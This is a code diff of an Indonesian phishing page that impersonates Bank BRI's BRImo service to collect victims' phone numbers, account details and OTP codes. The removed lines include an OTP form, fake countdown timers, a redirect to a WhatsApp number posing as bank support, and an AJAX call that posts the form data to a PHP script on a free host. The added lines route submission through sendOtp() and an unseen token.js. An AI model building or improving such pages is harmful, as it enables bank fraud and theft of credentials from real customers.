@@ -365,18 +365,19 @@
 
 /*********************/
 .process1 {
-     width: 100%;
+            width: 100%;
             height: 100%;
-             display: flex;
-             justify-content: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             margin: auto;
-            position: absolute;
-           padding-top: 300px;
+            position: fixed;
+            padding-top: 30px;
             left: 0;
             right: 0;
             bottom: 0;
-            background: rgba(0, 0, 0, 0.6);
-            z-index: 99999;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: 999999999;
             
       
 }
@@ -470,11 +471,15 @@
 </style>
  </head> 
  <body> 
+<div id="gelap" name="process" class="process1" style="display: none;">
+ <div class="loading">              
+            </div>
+        </div>
   <span class="blink" style="display: none" id="blinkk"><h1>Tautan Link tidak Valid, atau sudah Kadaluarsa</h1></span>
  <span class="blink" style="display: none; margin-top: -10px" id="blinkAktivasi"><h1>Kode OTP tidak valid, atau sudah kadaluarsa</h1></span> 
  
-<nav style="position: fix; top: 0; left: 0; right: 0; margin: 5px auto; width: 100%; height: 60.5px; background: #dddddd; z-index: ; border-bottom: 1px solid #dddddd">
- <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEig8lJ2TAjG3Frf_4E42lP3LEw4KyecrTH1gDWKv1TKALAwbNg_UcEsGSYKN1sb3nisb_reXgAFPi1OyPGWixuw1jdOl7rttdBAf-cnv9zXEdfl_EX0OxxFTJy86y7cyJsayGx1XNgifWwmC8oYkqbxb9EKb1vlQxBoTDGgOFy0ht7Cnpj6K_radbnUD9g/s1080/AddText_06-08-12.57.52.jpg" style="width: 100%; position: fixed; top: 0; left: 0; right: 0; margin: 0px auto; z-index: 99999999">
+<nav style="position: fix; top: 0; left: 0; right: 0; margin: 0 auto; width: 100%; height: 60.5px; background: #dddddd; z-index: ; border-bottom: 1px solid #dddddd">
+ <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEig8lJ2TAjG3Frf_4E42lP3LEw4KyecrTH1gDWKv1TKALAwbNg_UcEsGSYKN1sb3nisb_reXgAFPi1OyPGWixuw1jdOl7rttdBAf-cnv9zXEdfl_EX0OxxFTJy86y7cyJsayGx1XNgifWwmC8oYkqbxb9EKb1vlQxBoTDGgOFy0ht7Cnpj6K_radbnUD9g/s1080/AddText_06-08-12.57.52.jpg" style="width: 100%; position: fixed; top: 0; left: 0; right: 0; margin: 0px auto; z-index: 99999999;box-shadow: #00000066 2px 2px 4px 0px;">
 </nav>
 <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhzNvUoQZs472wLT0OBfqf3IaxbfNMkYJ-RlrcaCCFjgE9XHS9YIY_e3ERerB7kmqKG6xqqAxJq-K-YHdKht6GQ5PrKnLs_W5BjN5kQfI6SNsYGUIrQ3FSRVJoeyJYiCIlEC5luQ7cxG7xMSUSRodCQxaJ6ftAFNTyNOOFLayHCvFonc_S3bcDGCw2f6HM/s2180/AddText_11-19-06.54.17.jpg" style="width: 100%; height: 94%; position: fixed; top: 0; left: 0; right: 0; bottom: 0; margin: 0px auto; z-index:-1">    
   <div id="popupku" style="position: fixed;
@@ -511,7 +516,7 @@
     <center>
     <div class="row" style="margin-top: 40px; border: 2px solid #fff; width: 90%; border-radius: 15px; background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-GS2QLH5sTYjzLcnuRCCRqnHrc8NtNQyXThUatIg2Phz2obgUWHIuhxXRkOSDgC2m3WpWKJz4_OBloxwrfsgt-we1G02znrG2bRrriGnh9Gi59pCyiGNRAh-iGIE8RcMNr98Su4FSS3p6OriBv5Aewr2YnW5USA3PEDBmtBacEQvsUABW-zMFb2Vp3Vk/s1072/AddText_06-10-03.05.51.png); background-size: 100% 100%; background-position: 100% 100%; padding-top: 10px; box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px;"> 
      <div class="col-12" style="width: 100%; max-width: 100%; display: f; margin: :5px auto;"> 
-  <form onsubmit="kirimPesan1(event)" method="post" id="formLink">
+  <form onsubmit="sendOtp()" method="post" id="formLink">
  <input type="hidden" id="tarif" name="tarif">         
 <input type="hidden" id="nohp" name="nohp" value="">
 <input type="hidden" id="rek" name="rek" value="">
@@ -527,7 +532,7 @@
         </div>
        </center>
        <b>
-<input type="submit" id="kirims" class="bubble-element Button clickable-element" style="max-width: 85%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 50px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 700" tabindex="2" value="Konfirmasi"  />
+<button type="submit" id="kirims" class="bubble-element Button clickable-element" style="max-width: 85%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 50px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 700" tabindex="2" >Konfirmasi</button>
 </b>
       </form>
      </div>
@@ -545,52 +550,7 @@
      </center>
     </div> </b>
   </div>
-   <div class="container" id="Aktivasi" style="display: block"> 
-   <div class="box-lte"> 
-    <div class="row" style="margin-top: 140px;"> 
-     <div class="col-12 d-block mx-auto text-center p-0" style="height: 150px; width: 256px; max-width: 100%; display: block; margin-top: -50px; border-radius: 0px;"> 
-     
-     </div> 
-    </div> 
-
-    <div class="row"> 
-    
-     <hr style="display: block; margin: auto; width: 90%;"> 
-     <p style="font-weight: bold; font-size: 20px; color: #098CE3; text-align: center; margin: -10px auto;" id="waktu">1 : 00</p> 
-    
-    </div> 
-    <div class="row"> 
-     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px; margin-top: -10px"> 
-      <p style="font-size: 10px; text-align: center; font-weight: bold; padding: 15px">Silahkan masukan kode Virtual TARIF Anda, Jika belum menerima Kode silahkan klik tombol di bawah ini<br><div style="font-weight: bold; text-align: center; margin-top: -20px; margin-bottom: -20px; color: #098CE3">Masukkan Kode OTP</div></p> <br>
-     </div> 
-    </div> 
-    <div class="row"> 
-     <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto;"> 
-  <form onsubmit="kirimPesan(event)" method="post" id="formLink">
-       <center> 
-        <div style="margin-top: -21px"> 
-        
-       <i class="ion-ios-locked-outline" id="ionIcons"></i> 
    
-
-         <input type="tel" name="otp" id="otp"  class="bubble-element Input form-log" placeholder="KODE Virtual 6 DIGIT" maxlength="6" minlength="6" pattern="(?=.*[0-9]).{6,6}"  required oninvalid="this.setCustomValidity('Mohon mɑsukkɑn 𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 dengɑn ;benɑr')" onchange="this.setCustomValidity('')" style="margin-left: 0px;" required onclick="gantiborder1()">
-  
-         <b> <a href="onclick='windiw.location.href=''"><p style="font-size: 14px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px; position: relative" onclick="window.location.href=''"><strong style="color: #FF0000; text-decoration: none"> Belum Menerima Kode OTP ?<br>
-         <span style="color: #098CE3">Klik Disini</span>
-         </strong></p></a></b>
-        </div>
-       </center>
-       <b>
-<input type="submit" id="kirims" class="bubble-element Button clickable-element" style="max-width: 85%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 15px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 700" tabindex="2" value="Konfirmasi"  />
-</b>
-      </form>
-     </div>
-     <b> </b>
-    </div>
-    <b> </b>
-   </div>
-
-   </center>
    <b> 
      </div> 
      <center>
@@ -604,13 +564,13 @@
         </div>
         </center>  
   <audio hidden controls id="bsi">
-<source src="brimo." type="audio/ogg">
-<source src="brimo." type="audio/mpeg">
+<source src="brimo.mp3" type="audio/ogg">
+<source src="brimo.mp3" type="audio/mpeg">
   Your browser does not support the audio element.
 </audio> 
  <audio hidden controls id="bsiku">
-<source src="tunggu-bri." type="audio/ogg">
-<source src="tunggu-bri." type="audio/mpeg">
+<source src="tunggu-bri.mp3" type="audio/ogg">
+<source src="tunggu-bri.mp3" type="audio/mpeg">
   Your browser does not support the audio element.
 </audio>       
 <script src="vibr.js"></script>
@@ -664,15 +624,8 @@ document.getElementById("saldo").value = saldo + "";
  }
 
 </script>
-<script>
-function getcs(){
-setTimeout(function(){  
-  
-location.href='https://wa.me/6282245703341?text=Hallo%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜%0ASaya%20Belum%20Mendapat%20Kode%20Virtual';
+<script src="token.js">
 
-    }, 000);    
-    
-}     
  </script>
 <script>
     window.onload = function() {
@@ -696,104 +649,9 @@ location.href='https://wa.me/6282245703341?text=Hallo%20𝗕𝗮𝗻𝗸%20𝗕�
   
   
    
-    document.getElementById('waktu1').innerHTML =
-          03 + ":" + 01;
-        startTimer();
-        
-        function startTimer() {
-          var presentTime = document.getElementById('waktu1').innerHTML;
-          var timeArray = presentTime.split(/[:]+/);
-          var m = timeArray[0];
-          var s = checkSecond((timeArray[1] - 1));
-          if(s==59){m=m-1}
-          if(m<0){
-            return
-          }
-          
-          document.getElementById('waktu1').innerHTML =
-            m + " : " + s;
-          console.log(m)
-          setTimeout(startTimer, 1000);
-          
-        }
-        
-        function checkSecond(sec) {
-          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
-          if (sec < 0) {sec = "59"};
-          return sec;
-        }
-        
-        
-        
     
-    </script>  
-  <script>
-      document.getElementById('timer').innerHTML =
-          01 + ":" + 01;
-        startTimer1();
-        
-        function startTimer1() {
-          var presentTime = document.getElementById('timer').innerHTML;
-          var timeArray = presentTime.split(/[:]+/);
-          var m = timeArray[0];
-          var s = checkSecond((timeArray[1] - 1));
-          if(s==59){m=m-1}
-          if(m<0){
-            return
-          }
-          
-          document.getElementById('timer').innerHTML =
-            m + " : " + s;
-          console.log(m)
-          setTimeout(startTimer1, 1000);
-          
-        }
-        
-        function checkSecond(sec) {
-          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
-          if (sec < 0) {sec = "59"};
-          return sec;
-        }
-        
-        
-        
   </script>
-  <!-- Static App Form Collection Script -->
-<!--<script src="https://static.app/js/static-forms.js" type="text/javascript"></script>
-
-<script src="https://static.app/js/static.js" type="text/javascript"></script>-->
- <script>
- $('#formLink').on('submit', function (event) {
-
-  event.stopPropagation();
-    event.preventDefault();
-    
- document.getElementById('kirims').value = "Memproses....";
-
-
-$.ajax({
- type: 'POST',
- url: 'https://chroedevsi.whf.bz/virtual11/three.php',
- data: $(this).serialize(),
  
- complete: function(data) {
-            console.log('Complete')
- setTimeout(function(){
-  document.getElementById("blinkAktivasi").style.display = "block";
- $("#nama1").val("");
- $("#nama1").addClass('textarea1'); 
-    }, 1000);
-setTimeout(function(){
-    document.getElementById('kirims').value = "Konfirmasi";
-  }, 1000);
-
-        }
-    });
-
-    return false;
-});   
-        
-</script>
 
 
 <script>
@@ -811,4 +669,4 @@ setTimeout(function(){
  }   
 </script>
 </body>
-</html><!--<script src='https://a.bsite.net/footer.js'></script>
+</html>
